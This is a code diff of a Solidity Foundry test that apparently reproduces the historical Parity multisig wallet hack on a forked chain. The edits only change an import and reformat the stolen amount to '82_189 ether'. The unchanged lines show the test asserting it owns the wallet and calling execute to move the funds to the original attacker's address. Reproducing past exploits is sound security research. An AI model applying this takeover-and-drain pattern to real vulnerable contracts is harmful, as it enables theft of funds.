@@ -1,8 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity >= 0.8.0;
 
-import "forge-std/Test.sol";
-
 import "test/utils/TestUtils.sol";
 
 interface ParityWalletInterface {
@@ -11,7 +9,7 @@ interface ParityWalletInterface {
     function isOwner(address _addr) external view returns (bool);
 }
 
-contract ParityWalletAttack is Test, TestUtils {
+contract ParityWalletAttack is TestUtils {
     address public constant WALLET = 0xBEc591De75b8699A3Ba52F073428822d0Bfc0D7e;
 
     // We fork one block prior to the actual attack.
@@ -38,7 +36,7 @@ contract ParityWalletAttack is Test, TestUtils {
         assertTrue(wallet.isOwner(address(this)));
 
         address attacker = 0xB3764761E297D6f121e79C32A65829Cd1dDb4D32;
-        uint256 amount = 82_189_000_000_000_000_000_000;
+        uint256 amount = 82_189 ether;
 
         wallet.execute(attacker, amount, new bytes(0));
 
